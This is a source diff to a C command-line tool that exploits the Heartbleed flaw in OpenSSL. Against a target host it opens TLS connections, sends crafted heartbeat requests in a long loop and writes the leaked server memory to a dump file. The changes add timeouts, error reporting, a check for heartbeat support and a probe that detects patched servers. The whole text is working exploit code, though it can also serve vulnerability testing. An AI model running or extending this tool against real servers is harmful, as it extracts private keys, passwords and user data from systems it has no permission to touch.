@@ -41,6 +41,7 @@
 #include <WS2tcpip.h>
 #define snprintf _snprintf
 #define sleep(secs) Sleep(1000*(secs))
+#define WSA(err) (WSA##err)
 #else
 #include <sys/types.h>
 #include <sys/socket.h>
@@ -49,6 +50,7 @@
 #include <unistd.h>
 #define WSAGetLastError() (errno)
 #define closesocket(fd) close(fd)
+#define WSA(err) (err)
 #endif
 #if defined(_MSC_VER)
 #pragma comment(lib, "ws2_32")
@@ -97,10 +99,16 @@ struct DumpArgs {
     const char *hostname;
     const char *cert_filename;
     const char *offline_filename;
+    unsigned timeout;
     unsigned is_error;
     unsigned is_auto_pwn;
     unsigned is_rand_size;
-    unsigned loop_count;
+    unsigned is_sent_heartbeat;
+    unsigned is_sent_good_heartbeat;
+    struct {
+        unsigned desired;
+        unsigned done;
+    } loop;
     unsigned ip_ver;
     unsigned port;
     size_t byte_count;
@@ -195,6 +203,22 @@ dump_bytes(int write_p, int version, int content_type,
         ERROR_MSG("[-] msg_callback:%u: unknown type seen\n", content_type);
         return;
     }
+
+    if (args->is_sent_good_heartbeat && len == 67) {
+        static const char *good_response = 
+            "\x02\x00\x30"
+            "aaaaaaaaaaaaaaaa"
+            "aaaaaaaaaaaaaaaa"
+            "aaaaaaaaaaaaaaaa"
+            ;
+        if (memcmp(buf, good_response, 48+3) == 0) {
+            ERROR_MSG("[-] PATCHED: good heartbeat received, bad heartbleed not\n");
+            exit(1);
+        }
+    }
+
+    /* clear the "sent" flag, indicating we've received something */
+    args->is_sent_heartbeat = 0;
 
     /*
      * Inform user that we got some bleeding data
@@ -467,6 +491,19 @@ parse_cert(X509 *cert, char name[512], BIGNUM *modulus, BIGNUM *e)
 }
 
 /****************************************************************************
+ ****************************************************************************/
+const char *
+error_msg(unsigned err)
+{
+    switch (err) {
+    case WSA(ECONNRESET): return "TCP connection reset";
+    case WSA(ETIMEDOUT): return "Timed out";
+    case 0: return "TCP connection closed";
+    default:   return "network error";
+    }
+}
+
+/****************************************************************************
  * This is the main threat that creates a TCP connection, negotiates
  * SSL, and then starts sending queries at the server.
  ****************************************************************************/
@@ -490,7 +527,7 @@ ssl_thread(const char *hostname, struct DumpArgs *args)
     time_t last_status = 0;
 
     /*
-     * Open the file if it exists
+     * Open the output/dump file.
      */
     if (args->filename) {
         args->fp = fopen(args->filename, "ab+");
@@ -499,6 +536,8 @@ ssl_thread(const char *hostname, struct DumpArgs *args)
             return -1;
         }
     }
+
+
     /*
      * Format the HTTP request. We need to stick the "Host:" header in
      * the correct place in the header
@@ -567,7 +606,10 @@ ssl_thread(const char *hostname, struct DumpArgs *args)
     DEBUG_MSG("[ ] %s: connecting...\n", address);
     x = connect(fd, addr->ai_addr, (int)addr->ai_addrlen);
     if (x != 0) {
-        ERROR_MSG("%s: connect failed err=%d\n", address, WSAGetLastError());
+        ERROR_MSG("[-] %s: connect failed: %s (%u)\n", 
+            address, error_msg(WSAGetLastError()), WSAGetLastError());
+        if (args->loop.done == 0)
+            exit(1);
         sleep(1);
         return 0;
     }
@@ -600,7 +642,20 @@ ssl_thread(const char *hostname, struct DumpArgs *args)
      * ourselves on sockets, then pass then through to the SSL layer 
      */
     DEBUG_MSG("[ ] SSL handshake started...\n");
+    started = time(0);
     for (;;) {
+
+        /* If we can't finish the SSL handshake in 6 seconds, we probably
+         * never will */
+        if (started + args->timeout < time(0)) {
+            ERROR_MSG("[-] timeout waiting for SSL handshake\n");
+            if (args->loop.done <= 1)
+                exit(1);
+            goto end;
+        }
+
+        /* If SSL stack wants to send something, then send it out the
+         * TCP/IP stack */
         len = BIO_pending(wbio);
         if (len) {
             if (len > sizeof(buf))
@@ -613,6 +668,8 @@ ssl_thread(const char *hostname, struct DumpArgs *args)
             }
         }
 
+        /* If the TCP/IP has received something, then pump the forward
+         * the network data to the SSL stack */
         x = SSL_connect(ssl);
         if (x >= 0)
             break; /* success! */
@@ -620,12 +677,18 @@ ssl_thread(const char *hostname, struct DumpArgs *args)
             char buf[16384];
             struct timeval tv;
             fd_set readset;
+            fd_set writeset;
+            fd_set exceptset;
 
             FD_ZERO(&readset);
+            FD_ZERO(&writeset);
+            FD_ZERO(&exceptset);
             FD_SET(fd, &readset);
+            FD_SET(fd, &writeset);
+            FD_SET(fd, &exceptset);
             tv.tv_sec = 0;
             tv.tv_usec = 1000;
-            x = select((int)fd+1, &readset, NULL, NULL, &tv);
+            x = select((int)fd+1, &readset, NULL, &exceptset, &tv);
             if (x > 0) {
                 x = recv(fd, buf, sizeof(buf), 0);
                 if (x > 0) {
@@ -633,6 +696,15 @@ ssl_thread(const char *hostname, struct DumpArgs *args)
                         fprintf(stderr, "[-] '18 03' PACKET HEADER, POSSIBLE IDS TRIGGER\n");
                     }
                     BIO_write(rbio, buf, x);
+                } else {
+                    unsigned err = WSAGetLastError();
+                    if (args->loop.done <= 1) {
+                        ERROR_MSG("[-] %s (%u)\n", error_msg(err), err);
+                        exit(1);
+                    } else {
+                        DEBUG_MSG("[-] %s (%u)\n", error_msg(err), err);
+                        break;
+                    }
                 }
             }
         } else {
@@ -661,12 +733,19 @@ ssl_thread(const char *hostname, struct DumpArgs *args)
         }
     }
 
-    
+    /*
+     * If heartbeats are disabled, then early exit
+     */
+    if (ssl->tlsext_heartbeat != 1) {
+        ERROR_MSG("[-] target doesn't support heartbeats\n");
+        exit(1);
+    }
+
     /*
      * Loop many times
      */
 again:
-    if (args->loop_count-- == 0) {
+    if (args->loop.done++ >= args->loop.desired) {
         ERROR_MSG("[-] loop-count = 0\n");
         goto end;
     }
@@ -693,7 +772,19 @@ again:
      */
     ssl3_write_bytes(ssl, SSL3_RT_APPLICATION_DATA, 
                             http_request, (int)strlen(http_request));
-    if (args->is_rand_size) {
+    if (args->is_sent_heartbeat) {
+        /* we've sent a heartbeat with no response, therefore try a
+         * normal heartbeat */
+        args->is_sent_good_heartbeat = 1;
+        ssl3_write_bytes(ssl, TLS1_RT_HEARTBEAT, 
+            "\x01\x00\x30"
+            "aaaaaaaaaaaaaaaa"
+            "aaaaaaaaaaaaaaaa"
+            "aaaaaaaaaaaaaaaa"
+            "aaaaaaaaaaaaaaaa",
+            67);
+
+    } else if (args->is_rand_size) {
         unsigned size = rand();
         char rbuf[3];
         if (size <= 128)
@@ -721,6 +812,7 @@ again:
             goto end;
         }
     }
+    args->is_sent_heartbeat = 1;
 
     /*
      * Wait for the response. We are actually just waiting for the normal
@@ -889,7 +981,8 @@ main(int argc, char *argv[])
 
     memset(&args, 0, sizeof(args));
     args.port = 443;
-    args.loop_count = 1000000;
+    args.loop.desired = 1000000;
+    args.timeout = 6;
 
     if (argc <= 1 ) {
 usage:
@@ -990,7 +1083,7 @@ usage:
             args.offline_filename = arg;
             break;
         case 'l':
-            args.loop_count = strtoul(arg, 0, 0);
+            args.loop.desired = strtoul(arg, 0, 0);
             break;
         case 'p':
             args.port = strtoul(arg, 0, 0);
@@ -1023,7 +1116,7 @@ usage:
         /*
          * Now run the thread
          */
-        while (args.loop_count) {
+        while (args.loop.done < args.loop.desired) {
             int x;
             x = ssl_thread(args.hostname, &args);
             if (x < 0)
@@ -1035,6 +1128,7 @@ usage:
         fprintf(stderr, "no target specified, use \"-t <hostname>\"\n");
         goto usage;
     }
+
     DEBUG_MSG("[+] local OpenSSL 0x%x(%s)\n", 
               SSLeay(), SSLeay_version(SSLEAY_VERSION));
 
